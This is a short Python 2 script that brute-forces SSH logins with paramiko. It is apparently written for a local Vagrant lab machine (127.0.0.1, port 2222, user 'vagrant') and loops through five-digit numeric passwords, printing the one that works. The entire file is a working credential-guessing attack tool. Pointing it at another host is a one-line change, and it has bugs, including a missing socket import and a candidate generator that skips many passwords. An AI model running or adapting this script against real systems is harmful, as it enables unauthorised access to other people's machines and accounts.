#!/usr/bin/python
import paramiko
import itertools,string,crypt
 
PASSSIZE = 5
IPADDRESS = "127.0.0.1"
USERNAME = "vagrant"
SSHPORT=2222
 
# Run /vagrant/bin/pythonDependencies.bash to get all dependencies.
# Generates a password of containing only digits with a size of PASSSIZE

var = itertools.combinations(string.digits,PASSSIZE)
 
try:
    for i in var:
        passwd = ''.join(i)
 
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 
        try:
            ssh.connect(IPADDRESS , port=SSHPORT, username=USERNAME, password=passwd)
            print "Connected successfully. Password = "+passwd
            break
        except paramiko.AuthenticationException, error:
            print "Incorrect password: "+passwd
            
        except socket.error, error:
            print error      
          	
        except paramiko.SSHException, error:
            print error
            print "Most probably this is caused by a missing host key"
           
        except Exception, error:
            print "Unknown error: "+error
             
        ssh.close()
 
 
except Exception,error :
    print error
